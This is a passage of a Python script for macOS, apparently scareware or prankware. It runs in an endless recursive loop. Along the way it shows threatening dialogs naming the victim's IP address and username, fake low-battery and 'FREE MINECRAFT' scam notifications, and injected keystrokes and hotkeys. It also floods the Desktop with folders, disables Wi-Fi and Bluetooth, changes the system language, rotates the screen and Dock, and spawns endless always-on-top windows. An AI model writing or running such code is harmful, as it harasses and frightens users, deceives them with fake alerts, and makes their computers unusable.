    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path19])
    pyautogui.hotkey("command", "q")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "n")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "p")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system(f'defaults write com.apple.dock orientation -string {position3}')
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    os.system('killall Dock')
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "tab")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path20])
    turn180()
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("shift", "command", "3")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "tab")
    pyautogui.hotkey("ctrl", "space")
    subprocess.run(["open", path21])
    pyautogui.hotkey("f11")
    subprocess.run(["open", path22])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("shift", "command", "3")
    pyautogui.hotkey("alt", "command", "d")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path23])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path24])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    turn0()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("shift", "command", "3")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", img_path8])
    count += 1
    subprocess.run(["data/./blueutil", "-p", "0"])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path25])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path26])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    pyautogui.hotkey("shift", "command", "3")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("command", "tab")
    subprocess.run(["open", path27])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("shift", "command", "3")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "space")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "q")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "n")
    count += 1
    turn270()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "p")
    subprocess.run(["data/./blueutil", "-p", "0"])
    subprocess.run(["open", path28])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system(f'defaults write com.apple.dock orientation -string {position}')
    os.system('killall Dock')
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("f11")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", path29])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("command", "tab")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.click()
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    webbrowser.open("https://www.roblox.com/download/client?os=mac")
    pyautogui.hotkey("option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("shift", "command", "3")
    subprocess.run(["open", path30])
    count += 1
    pyautogui.hotkey("alt", "command", "d")
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", path31])
    pyautogui.hotkey("shift", "command", "3")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("command", "tab")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", path32])
    turn180()
    subprocess.run(["data/./blueutil", "-p", "0"])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["osascript", "-e", script3])
    pyautogui.hotkey("shift", "command", "3")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", path33])
    pyautogui.hotkey("command", "tab")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path34])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path9])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", path35])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.run(["open", path36])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    pyautogui.hotkey("alt", "command", "d")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.run(["open", path37])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(["open", path38])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", path39])
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path40])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system(f'defaults write com.apple.dock orientation -string {position2}')
    os.system('killall Dock')
    subprocess.run(["open", path41])
    turn90()
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.run(["open", path42])
    subprocess.run(["open", path43])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path44])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("option", "command", "d")
    subprocess.run(["data/./blueutil", "-p", "0"])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("shift", "command", "3")
    subprocess.run(["data/./blueutil", "-p", "0"])
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("command", "q")
    turn0()
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "n")
    pyautogui.hotkey("alt", "command", "d")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path8])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("command", "p")
    subprocess.run(["data/./blueutil", "-p", "0"])
    pyautogui.hotkey("f11")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path10])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["osascript", "-e", script2])
    os.system("osascript -e 'set volume output volume 65'")
    webbrowser.open("https://www.roblox.com/download/client?os=mac")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "space")
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system(f'defaults write com.apple.dock orientation -string {position3}')
    pyautogui.hotkey("ctrl", "option", "command", "8")
    os.system('killall Dock')
    pyautogui.hotkey("command", "q")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "n")
    pyautogui.hotkey("alt", "command", "d")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path1])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("command", "p")
    turn180()
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    pyautogui.hotkey("option", "command", "8")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("option", "command", "f5")
    pyautogui.hotkey("command", "q")
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    pyautogui.hotkey("command", "n")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "p")
    turn270()
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", img_path11])
    pyautogui.hotkey("alt", "command", "d")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "space")
    os.system("osascript -e 'set volume output volume 65'")
    os.system(f'defaults write com.apple.dock orientation -string {position}')
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system('killall Dock')
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(["osascript", "-e", script4])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "tab")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("shift", "command", "3")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("f11")
    subprocess.run(["open", img_path11])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("shift", "command", "3")
    os.system(f'defaults write com.apple.dock orientation -string {position2}')
    os.system('killall Dock')
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", img_path5])
    pyautogui.hotkey("command", "q")
    pyautogui.hotkey("command", "q")
    pyautogui.hotkey("command", "n")
    pyautogui.hotkey("command", "p")
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.run(["open", img_path4])
    pyautogui.hotkey("ctrl", "space")
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("shift", "command", "3")
    os.system("osascript -e 'set volume output volume 65'")
    webbrowser.open("https://www.roblox.com/download/client?os=mac")
    pyautogui.hotkey("f11")
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    turn270()
    os.system(f'defaults write com.apple.dock orientation -string {position3}')
    os.system('killall Dock')
    pyautogui.hotkey("alt", "command", "d")
    starting()
threading.Thread(target=starting, daemon=True).start()
# ----------------------------

# ------- widgets
def again():
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-transparent")
    root.attributes("-topmost", True)
    root.configure(bg="white")
    root.geometry()
    label = tk.Label(root, text="your pc is already dead, he just doesnt know it yet")
    label.pack()
    label.after(50, again)
    root.mainloop()
again()
# -----------------------
